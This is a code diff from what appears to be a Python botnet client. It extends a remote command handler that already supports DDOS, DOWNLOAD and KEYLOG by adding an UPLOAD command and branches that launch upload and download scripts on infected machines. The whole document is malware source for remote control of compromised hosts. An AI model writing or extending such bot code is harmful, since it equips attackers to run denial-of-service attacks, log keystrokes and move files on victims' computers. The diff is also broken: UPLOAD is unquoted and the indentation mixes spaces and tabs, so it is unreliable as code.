@@ -53,7 +53,7 @@ def most_common(list):
 
 #End of deferred chain to execute commands once they've been received
 def get_cmd(value,server,bot):
-	commands = ['DDOS','DOWNLOAD','KEYLOG']
+	commands = ['DDOS','DOWNLOAD','KEYLOG', UPLOAD]
 	try:
 		x = value.split()
 		cmd = x[0]
@@ -71,6 +71,18 @@ def get_cmd(value,server,bot):
 					print "Starting DDOS on {0}".format(tmp)
 					process=subprocess.Popen(tmp.split(),shell=False)
 					bot.cmdsrun['DDOS'] = True
+            if cmd == 'UPLOAD':
+				if bot.cmdsrun['UPLOAD'] is False:
+					tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
+					print "Starting upload on {0}".format(tmp)
+					process=subprocess.Popen(tmp.split(),shell=False)
+					bot.cmdsrun['UPLOAD'] = True
+            if cmd == 'DOWNLOAD':
+				if bot.cmdsrun['DOWNLOAD'] is False:
+					tmp = 'python download.py {0}'.format(' '.join(x[1:]))
+					print "Starting DOWNLOAD on {0}".format(tmp)
+					process=subprocess.Popen(tmp.split(),shell=False)
+					bot.cmdsrun['DOWNLOAD'] = True
 			#can add any arbitrary command we want
 			else:
 				print 'Feel free to implement your own commands!'
